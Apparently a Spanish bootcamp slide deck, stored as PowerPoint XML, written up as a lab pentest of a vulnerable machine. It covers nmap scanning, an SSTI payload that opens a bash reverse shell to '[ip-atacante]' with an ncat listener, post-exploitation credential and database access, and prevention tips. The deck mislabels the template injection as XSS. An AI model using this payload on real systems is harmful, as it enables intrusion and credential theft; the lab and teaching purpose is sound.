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4" r:id="rId4"/>
    <p:sldId id="285" r:id="rId5"/>
    <p:sldId id="274" r:id="rId6"/>
    <p:sldId id="286" r:id="rId7"/>
    <p:sldId id="288" r:id="rId8"/>
    <p:sldId id="289" r:id="rId9"/>
    <p:sldId id="301" r:id="rId10"/>
    <p:sldId id="290" r:id="rId11"/>
    <p:sldId id="292" r:id="rId12"/>
    <p:sldId id="298" r:id="rId13"/>
    <p:sldId id="299" r:id="rId14"/>
    <p:sldId id="300" r:id="rId15"/>
    <p:sldId id="30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Pentest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/>
              <a:t>Pruebas de Penetración</a:t>
            </a:r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Henríquez</a:t>
            </a:r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>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-DO" b="1" dirty="0"/>
              <a:t>Práctica: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>Practica de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>Pentesting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Descripción: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>Poner en practica los conocimientos de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>Pentesting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t> penetrando una maquina vulnerable en entorno de laboratorio controlado a través de Windows.</a:t>
            </a:r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>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/elchecho3000-blip/Ciberseguridad-bootcamp/tree/main/Pentesting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7134" y="1349228"/>
            <a:ext cx="4117258" cy="4145658"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>mpezamos utilizando la herramienta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> en la red, encontrando la maquina vulnerable con la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> 10.0.0.128, ya que tiene dos puertos abiertos y uno de ellos corriendo un servicio </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>upnp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>, luego reali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>zarle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> un ping para determinar el so que utiliza dicha maquina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0929" y="855406"/>
            <a:ext cx="6023937" cy="513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3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0208" y="645344"/>
            <a:ext cx="10311581" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Probamos con la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> y los puertos abiertos para verificar si tiene una vulnerabilidad para explotarla por la pagina web. Nos damos cuenta que con el puerto 5000 tenemos acceso a dicha vulnerabilidad. Pero en el código esta deshabilitada la función de escritura en el cuadro de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>.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667" y="2169912"/>
            <a:ext cx="9544665" cy="384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3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62316" y="528796"/>
            <a:ext cx="8067368" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Luego aplicamos los conocimientos de la herramienta del navegador para tener acceso al cuadro de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>. Posteriormente identificamos que es vulnerable al </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>cross</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>-site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>scripiting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> 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359"/>
            <a:ext cx="10515600" cy="429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3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54675" b="50717"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295399" y="3323765"/>
            <a:ext cx="9329558" cy="2035277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0184DF-E676-B18C-0B8F-BDC67718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460" y="897450"/>
            <a:ext cx="8019436" cy="2426315"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Para poder explotar esta vulnerabilidad utilizaremos una Shell-reversa. Utilizamos el comando </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>ncat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>nvlp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> [puerto-a-abrir] en nuestro CMD para poder recibir la petición desde la maquina que explotaremos y se conecta a nuestra pc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>via</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> ese puerto</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="177745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6008" y="884251"/>
            <a:ext cx="8939981" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Luego, este código lo pegamos en el cuadro de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> de la pagina vulnerable con nuestra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> y puerto en escucha, y posterior a esto volvemos al CMD y verificaremos que ya tenemos acceso a la maquina.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" sz="2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428338"/>
            <a:ext cx="10515600" cy="961820"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>{{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>.__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>init</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>__.__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>globals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>__.__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>builtins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>__.__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>import</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>__('os').popen("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t> -c '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t> -i &gt;&amp; /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>dev</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>/[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>-atacante]/[puerto] 0&gt;&amp;1'").</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0" err="1"/>
              <a:t>read</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-DO" dirty="0"/>
              <a:t>()}}</a:t>
            </a:r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EF968A79-A4F8-F438-E921-FC63A741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827206"/>
            <a:ext cx="10515600" cy="21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5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3542" y="1309022"/>
            <a:ext cx="7066935" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Para tener un mejor control de nuestro acceso pegamos este código para darle estabilidad a la conexión.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493" y="3391609"/>
            <a:ext cx="923101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6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4553" y="733836"/>
            <a:ext cx="8402894" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Y ya lo que nos queda es la fase de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>post-explotación</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>, aquí podemos empezar a buscar: saber la exactitud del SO en utilización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rcRect b="22988"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170252" y="2243116"/>
            <a:ext cx="9851496" cy="373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93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80083-B5E3-046A-D381-7CEB8AA9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890" y="955061"/>
            <a:ext cx="4544961" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Ver las credenciales de los usuarios</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" sz="2400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ADBE03D-560E-21DC-4923-D3C61D61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284" r="42371"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1268443" y="2802193"/>
            <a:ext cx="9347853" cy="213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67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77828" y="1070544"/>
            <a:ext cx="5636342" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Ver los archivos mixtos que tiene disponible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521" y="2396107"/>
            <a:ext cx="6858957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184762"/>
            <a:ext cx="10515600" cy="2348220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Marcador de contenid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5018"/>
            <a:ext cx="6006448" cy="360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4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26758" y="500062"/>
            <a:ext cx="4338484" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Hasta entrar a las bases de datos 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846" y="1825625"/>
            <a:ext cx="92923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7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4505" y="681037"/>
            <a:ext cx="2022987" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Y ver las tablas</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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9496" y="1825625"/>
            <a:ext cx="4713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2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94719" y="0"/>
            <a:ext cx="7937090" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="3600" b="1" dirty="0"/>
              <a:t>Como se puede prevenir esta explotación?</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" sz="36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CF8091-4BD6-C976-3777-0513CD30D2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1060" y="1136922"/>
            <a:ext cx="10469880" cy="5740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Cierra y asegura las puertas (Nivel Red)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Apaga lo que no uses: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 el puerto 5000 o el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UPnP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 son esenciales, se apagan.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Pon un policía en la entrada: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Configura un Firewall para que bloquee cualquier intento de conexión sospechosa o no autorizada desde fuera.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   Limpia lo que escribe el usuario (Nivel Web - Evitar XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" altLang="es-DO" sz="2400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Filtra las entradas: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 sistema no debe aceptar símbolos raros como &lt;script&gt; en los formularios o el buscador.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Desactiva el código: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 alguien logra meter un código, el navegador debe mostrarlo como simple texto y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ejecutarlo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Es como quitarle las balas a una pistola.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158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55743-301C-1E23-BEED-1F883B7D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1161"/>
            <a:ext cx="10515600" cy="573451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 Esconde las llaves (Nivel Credenciales)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Prohibido lo "por defecto":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Cambia las contraseñas que vienen de fábrica (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123456) por unas largas y complejas.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Protege las cookies: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Ponle el candado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HttpOnly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las sesiones. Esto hace que, aunque un hacker logre meter un virus XSS, el navegador no le permita robar la llave de la sesión.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Usa un túnel secreto (Nivel Cifrado)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Usa HTTPS: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Ponle un certificado de seguridad a la web. Así, todo lo que viaje por la red (como las contraseñas) irá encriptado, y si alguien usa herramientas como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Netcat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espiar, solo verá letras locas y basura que no se puede leer.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583114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1101" y="1766184"/>
            <a:ext cx="998979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s-DO" sz="3600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lo aprendido:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-DO" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>En esta practica de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>pentesting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> aprendí a explotar una maquina gracias a las vulnerabilidades existentes de un puerto abierto y con nula configuración de seguridad, utilizando herramientas como </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ncat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, además de conocimientos de las herramientas del navegador, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cross</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>-site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>scripiting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> y navegar por dicho sistema explotado para obtener credenciales de acceso y de configuración.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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0487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700</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Panorámica</PresentationFormat>
  <Paragraphs>44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Empezamos utilizando la herramienta nmap en la red, encontrando la maquina vulnerable con la ip 10.0.0.128, ya que tiene dos puertos abiertos y uno de ellos corriendo un servicio upnp, luego realizarle un ping para determinar el so que utiliza dicha maquina</vt:lpstr>
      <vt:lpstr>Probamos con la ip y los puertos abiertos para verificar si tiene una vulnerabilidad para explotarla por la pagina web. Nos damos cuenta que con el puerto 5000 tenemos acceso a dicha vulnerabilidad. Pero en el código esta deshabilitada la función de escritura en el cuadro de login.</vt:lpstr>
      <vt:lpstr>Luego aplicamos los conocimientos de la herramienta del navegador para tener acceso al cuadro de login. Posteriormente identificamos que es vulnerable al cross-site scripiting </vt:lpstr>
      <vt:lpstr>Para poder explotar esta vulnerabilidad utilizaremos una Shell-reversa. Utilizamos el comando ncat –nvlp [puerto-a-abrir] en nuestro CMD para poder recibir la petición desde la maquina que explotaremos y se conecta a nuestra pc via ese puerto</vt:lpstr>
      <vt:lpstr>Luego, este código lo pegamos en el cuadro de login de la pagina vulnerable con nuestra ip y puerto en escucha, y posterior a esto volvemos al CMD y verificaremos que ya tenemos acceso a la maquina.</vt:lpstr>
      <vt:lpstr>Para tener un mejor control de nuestro acceso pegamos este código para darle estabilidad a la conexión.</vt:lpstr>
      <vt:lpstr>Y ya lo que nos queda es la fase de post-explotación, aquí podemos empezar a buscar: saber la exactitud del SO en utilización</vt:lpstr>
      <vt:lpstr>Ver las credenciales de los usuarios</vt:lpstr>
      <vt:lpstr>Ver los archivos mixtos que tiene disponible</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>Hasta entrar a las bases de datos </vt:lpstr>
      <vt:lpstr>Y ver las tablas</vt:lpstr>
      <vt:lpstr>Como se puede prevenir esta explotación?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Luis Reyes Volquez</cp:lastModifiedBy>
  <cp:revision>34</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-31T00:35:05Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-24T13:34:18Z</dcterms:modified>
</cp:coreProperties>
</file>